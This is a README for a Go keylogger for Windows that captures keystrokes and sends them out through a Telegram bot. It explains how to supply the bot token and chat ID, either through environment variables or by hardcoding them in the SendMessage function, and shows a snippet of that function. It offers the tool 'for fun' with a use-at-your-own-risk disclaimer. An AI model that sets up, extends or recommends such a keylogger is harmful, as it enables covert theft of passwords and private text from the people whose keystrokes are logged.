# go-keylogger
Its a simple keylogger made in Go. Only works in Windows. Send keys by Telegram.

It's made for fun. Use only at your own risk.

## Set enviroment variables
With a simple Google search you can find this tutorial: https://docs.oracle.com/en/database/oracle/machine-learning/oml4r/1.5.1/oread/creating-and-modifying-environment-variables-on-windows.html#GUID-DD6F9982-60D5-48F6-8270-A27EC53807D0  

Or if you don't want to use them, only give the program a try, you can just change line 19 and 20 (first two lines of `SendMessage` func).

Now:
```go
func SendMessage(msg string) error {
	token := os.Getenv("TELEGRAM_TOKEN")
	chatID := os.Getenv("TELEGRAM_CHAT_ID")

  ...
}
```

After:
```go
func SendMessage(msg string) error {
	token := "8538434:FSHsahds-dsaad..."
	chatID := "1864....."

  ...
}
```

Obviusly, you have to set your own token and chatId.
